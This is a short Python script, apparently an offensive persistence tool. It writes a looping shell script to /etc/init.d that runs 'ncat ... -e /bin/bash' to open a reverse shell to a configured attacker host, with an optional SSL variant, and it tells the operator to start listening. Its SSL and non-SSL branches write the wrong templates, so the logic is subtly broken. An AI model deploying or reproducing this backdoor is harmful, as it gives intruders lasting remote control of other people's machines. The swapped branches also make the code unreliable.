#!/usr/bin/python

import sys,os,time,termcolor
from termcolor import cprint
from config import *

sh_template = '''
host={0}
port={1}
c=0
while [ $c -eq 0 ]; do
ncat -vv $host $port -e /bin/bash
sleep 3
done
'''.format(host,port)

sh_template_ssl = '''
host={0}
port={1}
c=0
while [ $c -eq 0 ]; do
ncat -vv $host $port -e /bin/bash --ssl
sleep 3
done
'''.format(host,port)

meterpreter_template = '''
a
'''
cprint("[+]Started at {0}".format(time.ctime()),"blue")
time.sleep(1)
if shell_type == "NC":  #add host and port to connect.sh to init.d 
 cprint("[+]NC Shell found on config ..","green")
 time.sleep(1)
 if ssl == True:
  cprint("[+]SSL connection enabled","yellow")
  time.sleep(1) 
  cprint("[+]Adding NC auto connect script to init.d","green")
  try:
	 f = open("/etc/init.d/connector.sh","w")
	 f.write(sh_template)
	 f.close()
	 cprint("[+]setup done ! you can listen to your host now","blue")
  except:  
         cprint("[!]cannot add connector.sh","red")
         sys.exit(0)	  	
#########################################################################33
 if ssl == False:
  cprint("[+]SSL connection disabled","yellow")
  time.sleep(1) 
  cprint("[+]Adding NC auto connect script to init.d","green")
  try:
	 f = open("/etc/init.d/connector.sh","w")
	 f.write(sh_template_ssl)
	 f.close()
	 cprint("[+]setup done ! you can listen to your host now","blue")
  except:  
         cprint("[!]cannot add connector.sh","red")
         sys.exit(0)	

else:
 cprint("[!]cannot find shell type","red")
 #os.system("cp connect.py /etc/init.d/connect.py") #create pattern
 #os.system("cp connect.sh /etc/init.d/connect.sh") #copy script to init.d

#if shell_type == "Meterpreter": #add host and port to connect.py to init.d
